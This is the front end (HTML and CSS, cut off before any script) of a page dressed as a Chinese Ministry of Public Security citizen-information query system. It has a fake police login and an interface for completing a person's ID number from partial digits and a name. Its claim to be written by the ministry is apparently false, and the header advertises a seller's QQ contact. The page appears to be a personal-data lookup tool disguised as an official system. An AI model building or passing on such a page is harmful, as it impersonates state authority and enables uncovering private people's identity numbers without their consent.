<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<title>公安信息查询系统</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
			font-family: 'Microsoft YaHei', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
		}
		
		body {
			background: linear-gradient(135deg, #0d1b3e, #1c3a6e);
			min-height: 100vh;
			display: flex;
			justify-content: center;
			align-items: flex-start;
			padding: 20px 15px;
			color: #333;
			position: relative;
			overflow-x: hidden;
		}
		
		body::after {
			content: "";
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="200" height="200"><path d="M100 20 L130 70 L190 80 L150 120 L160 180 L100 155 L40 180 L50 120 L10 80 L70 70 Z" fill="none" stroke="rgba(255,255,255,0.03)" stroke-width="3"/><circle cx="100" cy="100" r="40" fill="none" stroke="rgba(255,255,255,0.03)" stroke-width="3"/><path d="M100 60 L120 90 L150 95 L125 120 L130 150 L100 135 L70 150 L75 120 L50 95 L80 90 Z" fill="none" stroke="rgba(255,255,255,0.03)" stroke-width="2"/></svg>');
			background-size: 200px;
			background-position: center;
			opacity: 0.03;
			z-index: -1;
		}
		
		/* 协议弹窗样式 */
		.protocol-modal {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background: rgba(0, 0, 0, 0.85);
			display: flex;
			justify-content: center;
			align-items: center;
			z-index: 1000;
			opacity: 0;
			animation: fadeIn 0.8s forwards;
		}
		
		.protocol-content {
			background: linear-gradient(to bottom, #0d1b3e, #1c3a6e);
			border-radius: 8px;
			width: 90%;
			max-width: 650px;
			max-height: 80vh;
			overflow-y: auto;
			padding: 25px;
			box-shadow: 0 0 30px rgba(0, 0, 100, 0.8);
			border: 2px solid #d4af37;
			position: relative;
			transform: translateY(20px);
			animation: slideUp 0.6s 0.3s forwards;
		}
		
		.protocol-header {
			text-align: center;
			margin-bottom: 20px;
			padding-bottom: 15px;
			border-bottom: 2px solid #d4af37;
		}
		
		.protocol-header h2 {
			color: #fff;
			font-size: 1.8rem;
			margin-bottom: 10px;
			text-shadow: 0 2px 4px rgba(0,0,0,0.5);
		}
		
		.protocol-header .badge-icon {
			width: 60px;
			height: 60px;
			margin: 0 auto 15px;
			background: linear-gradient(45deg, #c00 30%, #1a2980 80%);
			border: 2px solid #d4af37;
			border-radius: 50%;
			display: flex;
			align-items: center;
			justify-content: center;
			position: relative;
			box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
		}
		
		.protocol-header .badge-icon::before {
			content: "";
			position: absolute;
			width: 40px;
			height: 40px;
			background: linear-gradient(135deg, #ffd700, #d4af37);
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 1;
		}
		
		.protocol-header .badge-icon::after {
			content: "";
			position: absolute;
			width: 30px;
			height: 30px;
			background: #c00;
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 2;
		}
		
		.protocol-body {
			background: rgba(255, 255, 255, 0.95);
			border-radius: 6px;
			padding: 20px;
			margin-bottom: 20px;
			box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.1);
		}
		
		.protocol-title {
			font-size: 1.3rem;
			color: #0d1b3e;
			margin-bottom: 15px;
			text-align: center;
			font-weight: bold;
		}
		
		.protocol-text {
			font-size: 0.9rem;
			line-height: 1.6;
			color: #333;
			max-height: 45vh;
			overflow-y: auto;
			padding-right: 10px;
		}
		
		.protocol-text p {
			margin-bottom: 15px;
			text-align: justify;
		}
		
		.protocol-text strong {
			color: #c00;
		}
		
		.protocol-footer {
			text-align: center;
		}
		
		.protocol-btn {
			background: linear-gradient(to right, #d4af37, #ffd700);
			color: #0d1b3e;
			border: none;
			border-radius: 6px;
			padding: 14px 40px;
			font-size: 1.1rem;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s ease;
			display: inline-flex;
			align-items: center;
			justify-content: center;
			gap: 10px;
			box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
			text-transform: uppercase;
			letter-spacing: 1px;
		}
		
		.protocol-btn:hover {
			transform: translateY(-3px);
			box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
			background: linear-gradient(to right, #ffd700, #d4af37);
		}
		
		.protocol-btn:active {
			transform: translateY(0);
		}
		
		/* 登录界面样式 */
		.login-container {
			display: none;
			width: 100%;
			max-width: 450px;
			background: rgba(255, 255, 255, 0.97);
			border-radius: 8px;
			box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
			overflow: hidden;
			animation: fadeIn 0.6s ease-out;
			border: 1px solid #2a5caa;
			margin: 20px 0;
			position: relative;
		}
		
		.login-header {
			background: linear-gradient(to right, #0d1b3e, #1c3a6e);
			color: white;
			padding: 25px 20px 20px;
			text-align: center;
			position: relative;
			overflow: hidden;
			border-bottom: 3px solid #d4af37;
		}
		
		.login-header::before {
			content: "";
			position: absolute;
			top: -50%;
			left: -50%;
			width: 200%;
			height: 200%;
			background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
			transform: rotate(30deg);
		}
		
		.login-header-content {
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 15px;
			position: relative;
			z-index: 2;
		}
		
		.login-badge {
			position: relative;
			width: 60px;
			height: 60px;
			display: flex;
			align-items: center;
			justify-content: center;
		}
		
		.login-badge-icon {
			width: 100%;
			height: 100%;
			background: linear-gradient(45deg, #c00 30%, #1a2980 80%);
			border: 2px solid #d4af37;
			border-radius: 50%;
			display: flex;
			align-items: center;
			justify-content: center;
			position: relative;
			box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
		}
		
		.login-badge-icon::before {
			content: "";
			position: absolute;
			width: 50px;
			height: 50px;
			background: linear-gradient(135deg, #ffd700, #d4af37);
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 1;
		}
		
		.login-badge-icon::after {
			content: "";
			position: absolute;
			width: 40px;
			height: 40px;
			background: #c00;
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 2;
		}
		
		.login-title {
			font-size: 1.6rem;
			margin-bottom: 8px;
			color: white;
			font-weight: bold;
			text-shadow: 0 2px 4px rgba(0,0,0,0.3);
			letter-spacing: 1px;
		}
		
		.login-description {
			font-size: 0.9rem;
			opacity: 0.9;
			max-width: 500px;
			margin: 10px auto 0;
			line-height: 1.4;
			position: relative;
			z-index: 2;
			color: #a0c4ff;
		}
		
		.login-content {
			padding: 30px;
		}
		
		.login-form-group {
			margin-bottom: 25px;
		}
		
		.login-label {
			display: block;
			margin-bottom: 10px;
			font-weight: 600;
			color: #0d1b3e;
			display: flex;
			align-items: center;
			gap: 8px;
		}
		
		.login-input-field {
			position: relative;
			margin-bottom: 5px;
		}
		
		.login-input-field i {
			position: absolute;
			left: 15px;
			top: 50%;
			transform: translateY(-50%);
			color: #0d1b3e;
			font-size: 1.1rem;
		}
		
		.login-input {
			width: 100%;
			padding: 14px 14px 14px 50px;
			border: 2px solid #a0c4ff;
			border-radius: 6px;
			font-size: 1rem;
			transition: all 0.3s ease;
			background: #fff;
			color: #0d1b3e;
			font-weight: 500;
		}
		
		.login-input:focus {
			border-color: #1c3a6e;
			box-shadow: 0 0 0 3px rgba(28, 58, 110, 0.2);
			outline: none;
		}
		
		.login-error {
			color: #e74c3c;
			font-size: 0.9rem;
			display: none;
			padding: 8px 0;
			font-weight: 500;
		}
		
		.login-btn {
			background: linear-gradient(to right, #0d1b3e, #1c3a6e);
			color: white;
			border: none;
			border-radius: 6px;
			padding: 14px 30px;
			font-size: 1.1rem;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s ease;
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 10px;
			box-shadow: 0 3px 8px rgba(13, 27, 62, 0.4);
			letter-spacing: 1px;
			text-transform: uppercase;
			width: 100%;
			margin-top: 10px;
		}
		
		.login-btn:hover {
			transform: translateY(-2px);
			box-shadow: 0 5px 15px rgba(13, 27, 62, 0.6);
			background: linear-gradient(to right, #1c3a6e, #0d1b3e);
		}
		
		.login-btn:active {
			transform: translateY(0);
		}
		
		.login-footer {
			text-align: center;
			padding: 20px 15px;
			color: #a0c4ff;
			font-size: 0.85rem;
			border-top: 2px solid #d4af37;
			background: #0d1b3e;
		}
		
		.login-footer p {
			margin-bottom: 5px;
		}
		
		/* 主系统样式 */
		.container {
			display: none;
			width: 100%;
			max-width: 800px;
			background: rgba(255, 255, 255, 0.97);
			border-radius: 8px;
			box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
			overflow: hidden;
			animation: fadeIn 0.6s ease-out;
			border: 1px solid #2a5caa;
			margin: 20px 0;
			max-height: 90vh;
			overflow-y: auto;
		}
		
		@keyframes fadeIn {
			from { opacity: 0; transform: translateY(20px); }
			to { opacity: 1; transform: translateY(0); }
		}
		
		@keyframes slideUp {
			from { transform: translateY(20px); opacity: 0; }
			to { transform: translateY(0); opacity: 1; }
		}
		
		header {
			background: linear-gradient(to right, #0d1b3e, #1c3a6e);
			color: white;
			padding: 25px 20px 20px;
			text-align: center;
			position: relative;
			overflow: hidden;
			border-bottom: 3px solid #d4af37;
			position: sticky;
			top: 0;
			z-index: 10;
		}
		
		header::before {
			content: "";
			position: absolute;
			top: -50%;
			left: -50%;
			width: 200%;
			height: 200%;
			background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
			transform: rotate(30deg);
		}
		
		.header-content {
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 15px;
			position: relative;
			z-index: 2;
		}
		
		.badge {
			position: relative;
			width: 60px;
			height: 60px;
			display: flex;
			align-items: center;
			justify-content: center;
		}
		
		.badge-icon {
			width: 100%;
			height: 100%;
			background: linear-gradient(45deg, #c00 30%, #1a2980 80%);
			border: 2px solid #d4af37;
			border-radius: 50%;
			display: flex;
			align-items: center;
			justify-content: center;
			position: relative;
			box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
		}
		
		.badge-icon::before {
			content: "";
			position: absolute;
			width: 50px;
			height: 50px;
			background: linear-gradient(135deg, #ffd700, #d4af37);
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 1;
		}
		
		.badge-icon::after {
			content: "";
			position: absolute;
			width: 40px;
			height: 40px;
			background: #c00;
			clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
			z-index: 2;
		}
		
		h1 {
			font-size: 1.8rem;
			margin-bottom: 8px;
			color: white;
			font-weight: bold;
			text-shadow: 0 2px 4px rgba(0,0,0,0.3);
			letter-spacing: 1px;
		}
		
		.description {
			font-size: 0.9rem;
			opacity: 0.9;
			max-width: 500px;
			margin: 10px auto 0;
			line-height: 1.4;
			position: relative;
			z-index: 2;
			color: #a0c4ff;
		}
		
		.main-content {
			padding: 20px;
		}
		
		.input-section {
			background: #eef5ff;
			border-radius: 8px;
			padding: 20px;
			box-shadow: inset 0 0 10px rgba(13, 27, 62, 0.1);
			margin-bottom: 15px;
			border: 1px solid #c5d6f0;
		}
		
		.input-group {
			display: flex;
			flex-direction: column;
			gap: 15px;
		}
		
		.input-title {
			font-size: 1.1rem;
			font-weight: 600;
			color: #0d1b3e;
			display: flex;
			align-items: center;
			gap: 8px;
			padding-bottom: 5px;
			border-bottom: 2px solid #d4af37;
		}
		
		.input-container {
			display: flex;
			flex-direction: column;
			gap: 12px;
			margin-top: 10px;
		}
		
		.input-field {
			flex: 1;
			position: relative;
		}
		
		.input-field i {
			position: absolute;
			left: 12px;
			top: 50%;
			transform: translateY(-50%);
			color: #0d1b3e;
			font-size: 1rem;
		}
		
		input, select {
			width: 100%;
			padding: 14px 14px 14px 45px;
			border: 2px solid #a0c4ff;
			border-radius: 6px;
			font-size: 1rem;
			transition: all 0.3s ease;
			background: #fff;
			color: #0d1b3e;
			font-weight: 500;
		}
		
		input:focus, select:focus {
			border-color: #1c3a6e;
			box-shadow: 0 0 0 3px rgba(28, 58, 110, 0.2);
			outline: none;
		}
		
		.gender-selection {
			display: flex;
			align-items: center;
			gap: 20px;
			padding: 10px;
			background: #f8fcff;
			border-radius: 6px;
			border: 1px solid #c5d6f0;
		}
		
		.gender-option {
			display: flex;
			align-items: center;
			gap: 8px;
			cursor: pointer;
		}
		
		.gender-option input[type="radio"] {
			width: auto;
			margin: 0;
		}
		
		.button-container {
			display: flex;
			gap: 15px;
			margin-top: 20px;
		}
		
		.search-btn {
			background: linear-gradient(to right, #0d1b3e, #1c3a6e);
			color: white;
			border: none;
			border-radius: 6px;
			padding: 14px 30px;
			font-size: 1rem;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s ease;
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 8px;
			box-shadow: 0 3px 8px rgba(13, 27, 62, 0.4);
			letter-spacing: 1px;
			text-transform: uppercase;
			flex: 1;
		}
		
		.stop-btn {
			background: linear-gradient(to right, #8B0000, #A52A2A);
			color: white;
			border: none;
			border-radius: 6px;
			padding: 14px 30px;
			font-size: 1rem;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s ease;
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 8px;
			box-shadow: 0 3px 8px rgba(139, 0, 0, 0.4);
			letter-spacing: 1px;
			text-transform: uppercase;
			flex: 1;
		}
		
		.search-btn:hover {
			transform: translateY(-2px);
			box-shadow: 0 5px 15px rgba(13, 27, 62, 0.6);
			background: linear-gradient(to right, #1c3a6e, #0d1b3e);
		}
		
		.stop-btn:hover {
			transform: translateY(-2px);
			box-shadow: 0 5px 15px rgba(139, 0, 0, 0.6);
			background: linear-gradient(to right, #A52A2A, #8B0000);
		}
		
		.search-btn:active, .stop-btn:active {
			transform: translateY(0);
		}
		
		.search-btn:disabled, .stop-btn:disabled {
			opacity: 0.6;
			cursor: not-allowed;
			transform: none;
		}
		
		.results-section {
			background: #fff;
			border-radius: 8px;
			padding: 25px 20px;
			box-shadow: inset 0 0 8px rgba(13, 27, 62, 0.1);
			display: none;
			animation: slideUp 0.5s ease forwards;
			border: 1px solid #c5d6f0;
		}
		
		.section-title {
			color: #0d1b3e;
			margin-bottom: 20px;
			display: flex;
			align-items: center;
			gap: 10px;
			font-size: 1.4rem;
			padding-bottom: 12px;
			border-bottom: 2px solid #d4af37;
			font-weight: bold;
		}
		
		.result-grid {
			display: grid;
			grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
			gap: 20px;
			margin-top: 15px;
		}
		
		.info-card {
			background: linear-gradient(135deg, #f8fcff, #ffffff);
			border-radius: 8px;
			padding: 18px;
			box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
			transition: all 0.3s ease;
			border: 1px solid #d1e0ff;
			position: relative;
			overflow: hidden;
			min-height: 130px;
			display: flex;
			flex-direction: column;
		}
		
		.info-card:hover {
			transform: translateY(-3px);
			box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
			border-color: #a0c4ff;
		}
		
		.info-card::before {
			content: "";
			position: absolute;
			top: 0;
			left: 0;
			width: 5px;
			height: 100%;
			background: linear-gradient(to bottom, #0d1b3e, #1c3a6e);
		}
		
		.card-title {
			font-weight: 600;
			color: #0d1b3e;
			margin-bottom: 12px;
			display: flex;
			align-items: center;
			gap: 8px;
			font-size: 1.1rem;
		}
		
		.card-title i {
			color: #c00;
			background: rgba(26, 41, 128, 0.1);
			padding: 8px;
			border-radius: 50%;
			width: 36px;
			height: 36px;
			display: flex;
			align-items: center;
			justify-content: center;
		}
		
		.card-value {
			font-size: 1.1rem;
			font-weight: 600;
			color: #0d1b3e;
			flex: 1;
			display: flex;
			align-items: center;
			word-break: break-all;
			line-height: 1.4;
			padding-left: 5px;
		}
		
		.id-value {
			font-size: 1rem;
			line-height: 1.4;
		}
		
		.verification-section {
			margin-top: 25px;
			padding: 18px;
			background: #e8f4ff;
			border-radius: 8px;
			border-left: 5px solid #0d1b3e;
		}
		
		.verification-title {
			font-size: 1.2rem;
			font-weight: 600;
			color: #0d1b3e;
			margin-bottom: 15px;
			display: flex;
			align-items: center;
			gap: 10px;
		}
		
		.verification-result {
			display: flex;
			align-items: center;
			gap: 10px;
			font-size: 1.1rem;
			font-weight: 500;
		}
		
		.verification-icon {
			font-size: 1.5rem;
		}
		
		.verification-success {
			color: #27ae60;
		}
		
		.verification-failure {
			color: #e74c3c;
		}
		
		.verification-waiting {
			color: #f39c12;
		}
		
		.loading {
			display: none;
			text-align: center;
			padding: 30px;
			background: #eef5ff;
			border-radius: 8px;
			margin: 20px 0;
			border: 1px solid #c5d6f0;
		}
		
		.spinner {
			width: 45px;
			height: 45px;
			border: 5px solid rgba(28, 58, 110, 0.1);
			border-top: 5px solid #0d1b3e;
			border-radius: 50%;
			margin: 0 auto 20px;
			animation: spin 1.2s linear infinite;
		}
		
		@keyframes spin {
			0% { transform: rotate(0deg); }
			100% { transform: rotate(360deg); }
		}
		
		.error {
			color: #e74c3c;
			margin-top: 12px;
			font-size: 0.9rem;
			display: none;
			padding: 10px 15px;
			background: #fdedee;
			border-radius: 6px;
			border-left: 4px solid #e74c3c;
			font-weight: 500;
		}
		
		.progress-container {
			margin: 20px 0;
			padding: 15px;
			background: #f8fcff;
			border-radius: 8px;
			border: 1px solid #c5d6f0;
		}
		
		.progress-header {
			display: flex;
			justify-content: space-between;
			margin-bottom: 10px;
			font-weight: 600;
			color: #0d1b3e;
		}
		
		.progress-bar {
			width: 100%;
			height: 20px;
			background: #e0e0e0;
			border-radius: 10px;
			overflow: hidden;
		}
		
		.progress-fill {
			height: 100%;
			background: linear-gradient(to right, #0d1b3e, #1c3a6e);
			border-radius: 10px;
			transition: width 0.3s ease;
		}
		
		.progress-info {
			display: flex;
			justify-content: space-between;
			margin-top: 8px;
			font-size: 0.9rem;
			color: #5a6b8c;
		}
		
		footer {
			text-align: center;
			padding: 20px 15px;
			color: #a0c4ff;
			font-size: 0.85rem;
			border-top: 2px solid #d4af37;
			background: #0d1b3e;
			position: sticky;
			bottom: 0;
		}
		
		.examples {
			display: flex;
			gap: 12px;
			margin-top: 15px;
			flex-wrap: wrap;
			justify-content: center;
		}
		
		.example {
			background: rgba(28, 58, 110, 0.2);
			color: #0d1b3e;
			padding: 8px 16px;
			border-radius: 20px;
			font-size: 0.85rem;
			cursor: pointer;
			transition: all 0.3s ease;
			border: 1px solid #a0c4ff;
			font-weight: 500;
		}
		
		.example:hover {
			background: rgba(28, 58, 110, 0.3);
			transform: translateY(-2px);
		}
		
		.security-warning {
			background: #fff8e6;
			border-radius: 8px;
			padding: 15px;
			margin: 20px 0;
			border-left: 4px solid #d4af37;
			font-size: 0.9rem;
			color: #0d1b3e;
			display: flex;
			gap: 10px;
		}
		
		@media (max-width: 768px) {
			.input-container {
				flex-direction: column;
			}
			
			.button-container {
				flex-direction: column;
			}
			
			.search-btn, .stop-btn {
				padding: 14px;
				width: 100%;
			}
			
			h1 {
				font-size: 1.5rem;
			}
			
			.main-content {
				padding: 15px;
			}
			
			.section-title {
				font-size: 1.2rem;
			}
			
			.result-grid {
				grid-template-columns: 1fr;
			}
			
			.header-content {
				flex-direction: column;
				text-align: center;
			}
			
			.container {
				max-height: 85vh;
			}
			
			.badge {
				margin-bottom: 15px;
			}
			
			.protocol-content {
				width: 95%;
				padding: 15px;
			}
			
			.protocol-header h2 {
				font-size: 1.4rem;
			}
			
			.login-container {
				max-width: 95%;
			}
			
			.login-content {
				padding: 20px;
			}
			
			.gender-selection {
				flex-direction: column;
				align-items: flex-start;
				gap: 10px;
			}
		}
		
		@keyframes shine {
			0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.7); }
			70% { box-shadow: 0 0 0 10px rgba(212, 175, 55, 0); }
			100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); }
		}
		
		@keyframes shake {
			0%, 100% { transform: translateX(0); }
			20%, 60% { transform: translateX(-4px); }
			40%, 80% { transform: translateX(4px); }
		}
		
		.input-hint {
			margin-top: 8px;
			font-size: 0.85rem;
			color: #5a6b8c;
			display: flex;
			align-items: center;
			gap: 8px;
			text-align: center;
			justify-content: center;
			font-weight: 500;
		}
		
		.system-info {
			display: flex;
			justify-content: space-between;
			margin-top: 15px;
			font-size: 0.8rem;
			color: #5a6b8c;
			padding: 0 5px;
		}
		
		.watermark {
			position: absolute;
			bottom: 10px;
			right: 10px;
			opacity: 0.05;
			font-size: 120px;
			font-weight: bold;
			color: #0d1b3e;
			z-index: 0;
			pointer-events: none;
			user-select: none;
		}
		
		.additional-content {
			padding: 15px;
			background: #f0f7ff;
			border-radius: 8px;
			margin-top: 20px;
			border: 1px solid #c5d6f0;
		}
		
		.content-title {
			color: #0d1b3e;
			font-size: 1.2rem;
			margin-bottom: 15px;
			padding-bottom: 8px;
			border-bottom: 1px solid #d4af37;
		}
		
		.content-grid {
			display: grid;
			grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
			gap: 15px;
		}
		
		.content-card {
			background: white;
			padding: 15px;
			border-radius: 6px;
			box-shadow: 0 2px 6px rgba(0,0,0,0.05);
			border-left: 3px solid #1c3a6e;
		}
		
		.content-card h3 {
			color: #0d1b3e;
			margin-bottom: 8px;
			display: flex;
			align-items: center;
			gap: 8px;
		}
		
		.content-card p {
			font-size: 0.9rem;
			color: #5a6b8c;
			line-height: 1.5;
		}
		
		.police-icon {
			background: linear-gradient(45deg, #c00, #1a2980);
			-webkit-background-clip: text;
			background-clip: text;
			color: transparent;
		}
		
		.log-output {
			margin-top: 20px;
			padding: 15px;
			background: #2c3e50;
			border-radius: 6px;
			max-height: 200px;
			overflow-y: auto;
			font-family: monospace;
			font-size: 0.85rem;
			color: #ecf0f1;
			display: none;
		}
		
		.log-entry {
			margin-bottom: 5px;
			padding-bottom: 5px;
			border-bottom: 1px solid rgba(255,255,255,0.1);
		}
		
		.log-time {
			color: #7f8c8d;
			margin-right: 10px;
		}
		
		.log-message {
			color: #ecf0f1;
		}
	</style>
</head>
<body>
	<!-- 协议弹窗 -->
	<div class="protocol-modal" id="protocolModal">
		<div class="protocol-content">
			<div class="protocol-header">
				<div class="badge-icon"></div>
				<h2><i class="fas fa-shield-alt"></i> 公安部全国人口信息库</h2>
				<p style="color: #a0c4ff; margin-top: 10px;">请仔细阅读以下条款与条件</p>
			</div>
			
			<div class="protocol-body">
				<div class="protocol-title">
					<i class="fas fa-exclamation-triangle" style="color: #d4af37; margin-right: 8px;"></i>
					下滑此处同意协议
				</div>
				
				<div class="protocol-text">
					<p><strong>第一条 软件定义</strong><br>
					本软件由公安部网络安全保卫局编写，仅限于警务人员合法使用，用于合法目的中国公民身份信息查询。</p>
					
					<p><strong>第二条 信息安全</strong><br>
					用户必须严格遵守《中华人民共和国网络安全法》及《公安信息查询管理规定》。</p>
					
					<p><strong>第三条 保密义务</strong><br>
					用户对所查询的信息负有严格保密义务。严禁泄露、传播、出售或用于非警务目的。违反保密义务将依法追究法律责任。</p>
					
					<p><strong>第四条 查询规范</strong><br>
					1. 查询仅限于合法查询<br>
					2. 不得登录多个账号<br>
					3. 每次查询需向当地法制部门备案<br>
					4. 不得为非备案查询理由进行信息查询</p>
					
					<p><strong>第五条 系统安全</strong><br>
					1. 警务人员一人一账号<br>
					2. 不得共享、转借账号或密码<br>
					3. 登录账号需严格保密<br>
					4. 发现系统漏洞应立即报告</p>
					
					<p><strong>第六条 法律责任</strong><br>
					警务人员非法使用使用该软件可能需要承受以下法律责任：<br>
					- 警告批评<br>
					- 行政拘留<br>
					- 记录档案</p>
					
					<p><strong>第七条 协议效力</strong><br>
					本协议自用户首次使用系统时生效。公安部保留随时修改本协议的权利，修改后的协议将在系统中公示。</p>
				</div>
			</div>
			
			<div class="protocol-footer">
				<button class="protocol-btn" id="agreeBtn">
					<i class="fas fa-check-circle"></i> 同意并进入系统
				</button>
			</div>
		</div>
	</div>
	
	<!-- 登录界面 -->
	<div class="login-container" id="loginContainer">
		<div class="login-header">
			<div class="login-header-content">
				<div class="login-badge">
					<div class="login-badge-icon"></div>
				</div>
				<div>
					<div class="login-title"><i class="fas fa-user-shield police-icon"></i> 公安信息查询系统</div>
					<p class="login-description">警务人员身份验证 - 内部专用系统</p>
				</div>
			</div>
		</div>
		
		<div class="login-content">
			<div class="security-warning">
				<i class="fas fa-exclamation-triangle" style="color: #d4af37; font-size: 1.2rem;"></i>
				<div>
					<strong>安全警示：</strong> 本系统仅供授权警务人员使用。所有登录行为将被记录，非法访问将依法追究责任。
				</div>
			</div>
			
			<div class="login-form-group">
				<label class="login-label">
					<i class="fas fa-user police-icon"></i> 警务账号
				</label>
				<div class="login-input-field">
					<i class="fas fa-id-card"></i>
					<input type="text" class="login-input" id="username" placeholder="请输入警务账号">
				</div>
			</div>
			
			<div class="login-form-group">
				<label class="login-label">
					<i class="fas fa-lock police-icon"></i> 登录密码
				</label>
				<div class="login-input-field">
					<i class="fas fa-key"></i>
					<input type="password" class="login-input" id="password" placeholder="请输入登录密码">
				</div>
			</div>
			
			<div class="login-error" id="loginError">
				<i class="fas fa-exclamation-circle"></i> 账号或密码错误，请重新输入
			</div>
			
			<button class="login-btn" id="loginBtn">
				<i class="fas fa-sign-in-alt"></i> 登录系统
			</button>
			
			<div class="system-info" style="margin-top: 20px;">
				<span><i class="fas fa-shield-alt police-icon"></i> 安全等级：中</span>
				<span><i class="fas fa-info-circle police-icon"></i> 系统版本：V2.3.1</span>
			</div>
		</div>
		
		<div class="login-footer">
			<p>© 2023 中华人民共和国公安部 | 系统编号：GA-LOGIN-2023-1107</p>
			<p style="margin-top: 5px; font-size: 0.75rem; color: #8da1cc;">
				<i class="fas fa-lock"></i> 安全提示：本系统受《中华人民共和国网络安全法》保护
			</p>
		</div>
	</div>
	
	<!-- 主系统界面 -->
	<div class="container" id="mainSystem">
		<header>
			<div class="header-content">
				<div class="badge">
					<div class="badge-icon"></div>
				</div>
				<div>
					<h1><i class="fas fa-search police-icon"></i> 公安部人口信息核验系统</h1>
					<p class="description">争端nb666，qq3913490108 - 数据来源：公安部人口信息库</p>
				</div>
			</div>
		</header>
		
		<div class="main-content">
			<div class="security-warning">
				<i class="fas fa-exclamation-triangle" style="color: #d4af37; font-size: 1.2rem;"></i>
				<div>
					<strong>安全警示：</strong> 本系统为公安内部专用平台，严禁非授权使用。所有查询操作将被记录备案，非法使用将依法追究责任。
				</div>
			</div>
			
			<div class="input-section">
				<div class="input-group">
					<div class="input-title">
						<i class="fas fa-keyboard police-icon"></i> 人口信息核验
					</div>
					
					<div class="input-container">
						<div class="input-field">
							<i class="fas fa-user"></i>
							<input type="text" id="nameInput" placeholder="请输入姓名">
						</div>
						
						<div class="input-field">
							<i class="fas fa-id-card"></i>
							<input type="text" id="idCardInput" placeholder="请输入身份证号（未知数字用x表示）">
						</div>
						
						<div class="gender-selection">
							<div class="gender-option">
								<input type="radio" id="genderMale" name="gender" value="男" checked>
								<label for="genderMale"><i class="fas fa-mars"></i> 男</label>
							</div>
							<div class="gender-option">
								<input type="radio" id="genderFemale" name="gender" value="女">
								<label for="genderFemale"><i class="fas fa-venus"></i> 女</label>
							</div>
							<div class="gender-option">
								<input type="radio" id="genderUnknown" name="gender" value="未知">
								<label for="genderUnknown"><i class="fas fa-question-circle"></i> 未知</label>
							</div>
						</div>
					</div>
					
					<div class="button-container">
						<button class="search-btn" id="searchBtn">
							<i class="fas fa-search"></i> 开始身份验证
						</button>
						<button class="stop-btn" id="stopBtn" disabled>
							<i class="fas fa-stop"></i> 停止验证
						</button>
					</div>
					
					<div class="error" id="errorMsg">
						<i class="fas fa-exclamation-circle"></i> 请输入有效的姓名和身份证号
					</div>
					
					<div class="examples">
						<div class="example" data-example="">示例: 合法公民姓名</div>
						<div class="example" data-example="">示例: 合法公民身份证号</div>
						<div class="example" data-example="">示例: 身份证号未知数用x代替</div>
					</div>
					
					<div class="system-info">
						<span><i class="fas fa-database police-icon"></i> 数据版本：2023.12</span>
						<span><i class="fas fa-sync-alt police-icon"></i> 最后更新：2023-11-15</span>
					</div>
				</div>
			</div>
			
			<div class="progress-container" id="progressContainer" style="display: none;">
				<div class="progress-header">
					<span>验证进度</span>
					<span id="progressPercent">0%</span>
				</div>
				<div class="progress-bar">
					<div class="progress-fill" id="progressFill" style="width: 0%"></div>
				</div>
				<div class="progress-info">
					<span id="currentProgress">0/0</span>
					<span id="remainingTime">预计时间: 计算中...</span>
				</div>
			</div>
			
			<div class="log-output" id="logOutput">
				<div class="log-entry">
					<span class="log-time">系统</span>
					<span class="log-message">系统准备就绪</span>
				</div>
			</div>
			
			<div class="results-section" id="resultsSection">
				<h2 class="section-title"><i class="fas fa-file-contract police-icon"></i> 身份证核验结果</h2>
				<div class="result-grid">
					<div class="info-card">
						<div class="card-title"><i class="fas fa-user-shield"></i> 姓 名</div>
						<div class="card-value" id="nameResult">-</div>
					</div>
					<div class="info-card">
